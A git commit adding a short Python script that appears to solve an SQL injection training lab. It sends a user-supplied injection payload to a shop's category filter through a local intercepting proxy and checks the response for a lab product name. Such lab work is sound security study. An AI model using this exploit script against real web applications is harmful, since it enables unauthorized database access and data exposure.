77bc02d239a7ae152fca63337b8b91bf450af130
Rana Khalil <ranakhalil101@gmail.com>
2021-01-23 22:17:56 -0500

    Create sqli-lab-01.py

---
+++ sql-injection/lab-01/sqli-lab-01.py
@@ -0,0 +1,28 @@
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def exploit_sqli(url, payload):
+    uri = '/filter?category='
+    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
+    if "Cat Grin" in r.text:
+        return True
+    else:
+        return False
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+        payload = sys.argv[2].strip()
+    except IndexError:
+        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
+        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
+        sys.exit(-1)
+
+    if exploit_sqli(url, payload):
+        print("[+] SQL injection successful!")
+    else:
+        print("[-] SQL injection unsuccessful!")
